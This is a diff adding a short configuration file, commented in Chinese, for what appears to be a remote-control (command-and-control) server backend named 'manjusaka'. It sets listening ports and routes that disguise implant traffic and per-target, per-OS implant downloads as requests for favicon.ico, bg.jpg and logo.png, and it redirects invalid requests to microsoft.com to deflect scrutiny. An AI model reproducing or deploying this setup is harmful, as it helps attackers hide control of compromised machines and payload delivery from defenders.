@@ -1,0 +1,32 @@
+[nps]
+
+#nps监听端口
+npsport = ":3200"
+
+#npc监听端口
+npcport = ":80"
+
+#NPU后台地址
+npuaddr = "manjusaka"
+
+#主交互路由，遵守gin路由规则 后端会读取target的值(最终url总长不能超64)
+npcroute = "/:target/favicon.ico"
+
+#npc母体下载路由，遵守gin路由规则 后端会读取target目标、和sys系统类型的值 
+downroute = "/:target/assert/:sys/bg.jpg"
+
+#非法请求时的转发地址 
+redirect = "http://www.microsoft.com"
+
+[fileservice]
+#文件服务地址 默认开启本地服务
+server = ""
+
+#文件操作路由，遵守gin路由规则 后端会读取target目标、和fid的值 
+route = "/images/:target/:fid/logo.png"
+
+#fid有效时间（秒）
+fidtimeout = 3600
+
+
+
